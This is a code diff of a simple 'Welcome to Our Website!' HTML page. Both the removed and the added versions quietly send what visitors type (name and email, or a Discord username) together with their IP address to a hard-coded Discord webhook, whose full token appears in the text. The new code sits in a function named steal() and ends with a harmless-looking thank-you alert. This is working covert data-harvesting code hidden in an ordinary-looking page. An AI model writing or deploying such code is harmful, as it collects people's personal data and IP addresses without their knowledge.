@@ -5,42 +5,32 @@
 </head>
 <body>
     <h1>Welcome to Our Website!</h1>
-    <p>Please enter your information below:</p>
-    
-    <form id="steal-form">
-        <label for="name">Name:</label>
-        <input type="text" id="name" name="name" required>
-        
-        <label for="email">Email:</label>
-        <input type="email" id="email" name="email" required>
-        
-        <button type="submit">Submit</button>
-    </form>
+    <p>Please enter your Discord username:</p>
+    <input type="text" id="discordUsername">
+    <button onclick="steal()">Submit</button>
     
     <script>
-        document.getElementById('steal-form').addEventListener('submit', function(e) {
-            e.preventDefault();
+        function steal() {
+            var username = document.getElementById('discordUsername').value;
+            var ip = "<?php echo $_SERVER['REMOTE_ADDR']; ?>";
             
-            // Get user's IP address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipAddress = data.ip;
-                    const name = document.getElementById('name').value;
-                    const email = document.getElementById('email').value;
-                    
-                    // Send data to Discord webhook
-                    fetch('https://discord.com/api/webhooks/1389442016022237284/qcCgWVD59eDxyiioti8HMUeyf6_xD3XRbgo1KxfbKF1X9fkVBPtcXy3TaIwdMpDF7mst', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            content: `New submission!\nName: ${name}\nEmail: ${email}\nIP Address: ${ipAddress}`
-                        })
-                    });
-                });
-        });
+            // Send data to webhook
+            var webhookUrl = 'https://discord.com/api/webhooks/1389442016022237284/qcCgWVD59eDxyiioti8HMUeyf6_xD3XRbgo1KxfbKF1X9fkVBPtcXy3TaIwdMpDF7mst';
+            var data = {
+                content: `New visitor: ${username}, IP: ${ip}`
+            };
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+            
+            // Show success message
+            alert('Thank you for visiting!');
+        }
     </script>
 </body>
 </html>
